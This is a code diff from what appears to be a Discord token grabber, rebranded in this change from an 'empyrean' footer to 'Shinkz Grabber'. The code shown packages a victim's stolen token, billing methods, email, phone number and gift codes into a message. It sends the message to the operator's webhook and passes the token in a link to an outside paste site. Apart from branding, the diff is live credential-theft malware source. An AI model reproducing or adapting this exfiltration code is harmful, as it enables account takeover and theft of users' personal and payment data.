@@ -342,7 +342,7 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:ggput0s7:987807677096820796> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
             embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
             embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
@@ -350,7 +350,7 @@ class upload_tokens:
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<a:slakkj:1065648937660325978> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="https://github.com/hagsdhjw/empyrean")
+            embed.set_footer(text="created by shinkz")
 
-            self.webhook.send(embed=embed, username="Shinkz", avatar_url="https://i.pinimg.com/736x/a0/f4/76/a0f476bbd75e2766ac4e6277153a47a7.jpg")
+            self.webhook.send(embed=embed, username="Shinkz Grabber", avatar_url="https://i.pinimg.com/736x/a0/f4/76/a0f476bbd75e2766ac4e6277153a47a7.jpg")
